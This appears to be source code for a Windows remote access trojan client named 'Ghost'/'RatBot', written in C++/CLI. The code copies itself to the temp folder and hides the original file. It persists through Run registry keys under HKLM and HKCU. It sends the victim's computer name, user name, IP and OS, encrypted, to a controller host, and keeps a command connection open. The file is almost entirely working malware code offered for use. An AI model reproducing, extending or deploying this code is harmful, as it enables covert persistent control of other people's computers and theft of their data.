#define TMPLOG "zombie.log"
#define GHOST_HIDE
#define GHOSTVER "dot"
#include "abstract_bot.h"
#include "encrypt.h"
#include "info_helpers.h"
#include "json.hpp"
#include "rat_bot.h"
#include <Lmcons.h>
#include <Shellapi.h>
#include <fstream>
#include <iostream>

using namespace System::Runtime::InteropServices;
using namespace std;
using json = nlohmann::json;

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Wininet.lib")

// ================================
// MOVE TO MAIN
// ===================================
RatBot current_bot;

void on_client_connect()
{

    current_bot.on_client_connect();
}

void on_client_rec_data(char* data)
{

    current_bot.on_client_rec_data(data);
}

DWORD WINAPI t_ping(LPVOID lpParams)
{
    return current_bot.ping(lpParams);
}

void main(cli::array<System::String ^> ^ args)
{
    if (args->Length < 2) {
        cout << "Insufficient arguments." << endl;
        exit(EXIT_FAILURE);
    }

    const char* str_host = (const char*)Marshal::StringToHGlobalAnsi(args[0]).ToPointer();
    const char* str_port = (const char*)Marshal::StringToHGlobalAnsi(args[1]).ToPointer();

    current_bot = RatBot(str_host, str_port);
    current_bot.start(on_client_connect, on_client_rec_data);
}

// ================================
// Abstract BOT
// ===================================
ABot::ABot(const char* str_host, const char* str_port)
{
    this->str_host = str_host;
    this->str_port = str_port;

    // save paths to temp, windows, and cmd
    GetTempPath(MAX_PATH, this->str_temp);
    GetSystemDirectory(this->str_windows, MAX_PATH);
    sprintf_s(c_cmd_dir, "%s\\cmd.exe", str_windows);

    // save current path
    HMODULE h_current_module;
    h_current_module = GetModuleHandleW(NULL);
    GetModuleFileNameA(h_current_module, c_current_path, MAX_PATH);
    s_current_path = (char*)c_current_path;
    s_current_path = s_current_path.substr(0, s_current_path.find_last_of('\\'));
}

void ABot::start(FPCLIENT_CB static_on_client_connect, FP_RES static_on_client_rec_data)
{
// if we arent running in temp, do persistance functions
#ifndef GHOST_HIDE
    if (strcmp(string(s_current_path + "\\").c_str(), str_temp) != 0) {
        copy_executable();
    } else {
        // todo: check to make sure we dont do this many times(?)
        add_executable_to_start_up();
    }
#endif

    // Remove previous log
    char c_temp_cmd[MAX_PATH];
    sprintf_s(c_temp_cmd, "%s%s", str_temp, TMPLOG);
    remove(c_temp_cmd);

    // Starting and idling server
    while (1) {
        if (client.init(str_host, str_port, TCP_SERVER, static_on_client_connect))
            client.listen(static_on_client_rec_data, false);

        if (client.Socket_Client != INVALID_SOCKET)
            closesocket(client.Socket_Client);

        b_cmd = false; // Safe reset
        Sleep(1000);
    }
}

void ABot::copy_executable()
{
    char c_new_path[MAX_PATH + FILENAME_MAX + 1]; // Path of the new copy of the executable
    std::string s_filename; // File name of the current executable
    s_filename = s_current_path.substr(s_current_path.find_last_of('\\') + 1);
    sprintf_s(c_new_path, "%s%s", str_temp, s_filename.c_str());

    // create file read stream for current file
    std::ifstream f_file_read((char*)c_current_path, std::ios::in | std::ios::binary);
    // create fiel out stream for new file
    std::ofstream f_file_write(c_new_path, std::ios::out | std::ios::binary);

    // Copy the contents of the current file to the new file
    f_file_write << f_file_read.rdbuf();

    // Close the file streams
    f_file_read.close();
    f_file_write.close();

    char paramFormat[23];
    sprintf_s(paramFormat, "%s %s", str_host, str_port);
    SetFileAttributes(c_current_path, FILE_ATTRIBUTE_HIDDEN);

    // Open the new file with the provided command-line parameters
    ShellExecute(NULL, "open", c_new_path, paramFormat, 0, SW_SHOW);
    exit(EXIT_SUCCESS);
}

void ABot::add_executable_to_start_up()
{
    HKEY h_key;
    long l_key;
    bool b_good = false;

    l_key = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &h_key);

    if (l_key == ERROR_SUCCESS) {
        char full_path[MAX_PATH + 50];
        sprintf_s(full_path, MAX_PATH + 50, "explorer.exe,\"%s %s %s\"", c_current_path, str_host, str_port);
        long l_set_key = RegSetValueEx(h_key, "Ghost", 0, REG_SZ, (LPBYTE)full_path, MAX_PATH);

        if (l_set_key == ERROR_SUCCESS)
            b_good = true;

        RegCloseKey(h_key);
    }

    if (!b_good) {
        // Adding to start-up since we couldn't use the Shell start-up.
        l_key = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &h_key);

        // No admin access. Just make it user startup.
        if (l_key == ERROR_ACCESS_DENIED) {
            l_key = RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &h_key);
        }

        if (l_key == ERROR_SUCCESS) {
            char full_path[MAX_PATH + 50];
            sprintf_s(full_path, MAX_PATH + 50, "\"%s\" %s %s", c_current_path, str_host, str_port);

            RegSetValueEx(h_key, "Ghost", 0, REG_SZ, (LPBYTE)full_path, MAX_PATH);
            RegCloseKey(h_key);
        }
    }
}

void ABot::on_client_connect()
{
    json sys_data;
    TCHAR c_comp_name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD c_comp_size;
    DWORD c_username_size = UNLEN + 1;
    char c_username[UNLEN + 1];

    c_comp_size = sizeof(c_comp_name);
    GetComputerName(c_comp_name, &c_comp_size);
    GetUserName(c_username, &c_username_size);

    sys_data["ID"] = c_comp_name;
    sys_data["USER"] = c_username;
    sys_data["IP"] = real_ip();
    sys_data["PORT"] = str_port;
    sys_data["VERSION"] = GHOSTVER;

    OSVERSIONINFO vi;
    vi.dwOSVersionInfoSize = sizeof(vi);

    string os_output = "Unknown";
    if (GetVersionEx(&vi) != 0) {
        switch (vi.dwMajorVersion) {
        case 10: {
            os_output = "Windows 10";
            break;
        }
        case 6: {
            if (vi.dwMinorVersion == 3)
                os_output = "Windows 8.1";
            else if (vi.dwMinorVersion == 2)
                os_output = "Windows 8";
            else if (vi.dwMinorVersion == 1)
                os_output = "Windows 7";
            else
                os_output = "Windows Vista";
            break;
        }
        case 5: {
            if (vi.dwMinorVersion == 2)
                os_output = "Windows Server 2003 R2";
            else if (vi.dwMinorVersion == 1)
                os_output = "Windows XP";
            else if (vi.dwMinorVersion == 0)
                os_output = "Windows 2000";
            break;
        }
        default: {
            os_output = "Unknown";
            break;
        }
        }

#ifdef _WIN32
        os_output += " 32-bit";
#elif _WIN64
        os_output += " 64-bit";
#endif
    }
    sys_data["OS"] = os_output;

    client.send_data(encryptCMD(sys_data.dump()).c_str());

    CreateThread(0, 0, t_ping, 0, 0, 0);
}

DWORD ABot::ping(LPVOID lpParams)
{
    while (1) {
        Sleep(3000);
        char buf;
        int err = recv(client.Socket_Client, &buf, 1, MSG_PEEK);
        if (err == SOCKET_ERROR) {
            if (WSAGetLastError() != WSAEWOULDBLOCK) {
                client.close();
                break;
            }
        }
    }
    return 0;
}
